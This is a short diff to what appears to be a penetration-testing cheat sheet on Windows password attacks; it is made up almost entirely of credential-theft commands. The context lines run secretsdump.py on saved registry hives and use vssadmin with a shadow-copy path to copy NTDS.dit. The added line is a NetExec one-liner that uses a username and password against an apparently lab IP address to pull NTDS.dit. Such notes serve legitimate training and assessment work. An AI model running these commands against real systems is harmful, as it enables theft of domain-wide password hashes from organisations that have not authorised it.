@@ -75,6 +75,10 @@ python3 secretsdump.py -sam sam.save -security security.save -system system.save
 # Create volume shadow copy and copy NTDS.dit
 vssadmin CREATE SHADOW /For=C:
 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+
+# Using NetExec to capture NTDS.dit - One-liner
+netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
+
 ```
 
 ### Linux Local Password Attacks
